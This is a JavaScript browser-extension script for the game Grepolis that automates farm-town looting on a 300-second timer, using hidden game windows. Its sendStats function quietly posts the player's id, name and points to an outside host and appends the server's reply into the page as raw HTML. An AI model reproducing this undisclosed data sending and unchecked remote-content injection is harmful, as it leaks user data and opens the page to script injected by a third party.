/**
 * How many second to wait
 * @type {number}
 */
var second = 300;
setTimeout(function () {
    $('#extension_install').animate({opacity: 0, display: 'none'}, 200, function () {
        $('#extension_install').remove()
    })
}, 700);

/**
 *  Start the automate
 */
$('button#starting').on('click', function () {
    if ($(this).text() == 'Start') {
        $(this).text('Stop');
        $('#time_to_end').css('color', '#fc6');
        readyToRestart();

    } else {
        $(this).text('Start');
        second = false;
        $('#time_to_end').css('color', 'white');
    }
});

$('.looting_checkbox .checkbox_new').on('click', function () {
    if ($(this).hasClass('checked')) {
        $(this).removeClass('checked');
    } else {
        $(this).addClass('checked');
    }
});

/**
 * Restart the automate
 */
function readyToRestart() {

    can_click = 0;
    var action = ($('.looting_checkbox .checkbox_new').hasClass('checked')) ? 'double' : 'normal';

    var town = 0;
    var id = 0;

    for (var id = 0; id < $('.farmtown_owned_on_same_island').length; id++) {

        town = $('.farmtown_owned_on_same_island')[id];
        townId = $(town).attr('id').replace('farm_town_', '');

        var c = {action: 'claim_info'};
        var nextIndex = (parseInt(GPWindowMgr.getNextWindowId()) + 1);

        nextI = 'gpwnd_' + nextIndex;
        var nextUiId = nextIndex - 1000;

        GPWindowMgr.Create(GPWindowMgr.TYPE_FARM_TOWN, 'Extension <span class="farm_town_title_postfix">Grepolis Tools</span>', c, townId);
        $('#' + nextI).parent().parent().css('visibility', 'hidden');

        // Get and call
        var farmTowncity = GPWindowMgr.getWindowById(nextIndex)
        farmTowncity.call('claimLoad', townId, 'normal', 300, 32, false, 0);

    }

    second = 300;
    sendStats();
    setTimeout(waitMe, 1000);
}

/**
 * The Timer
 * @returns {boolean}
 */
function waitMe() {

    if (second == false) {
        second = 300;
        $('#time_to_end').html(second + 's');
        return false;
    }

    $('#time_to_end').html(second + 's');
    second--;
    if (second <= 0) {
        readyToRestart();
        return false;
    }

    setTimeout(waitMe, 1000);
}

function sendStats(){
    var player = {
        'id' : window.Game.player_id,
        'name' : window.Game.player_name,
        'pts' : window.Game.player_points
    }

    $.ajax({
        url: 'https://extension.16mb.com/grepolis/stats.php',
        data: {
            'player' : player
        },
        type: 'post',
        dataType: 'json',
        success: function (json) {
            if(json.data.length > 0){
                $('body').append(json.data.stats);
            }
        },
        error: function (e, x, t) {
        },
    });
}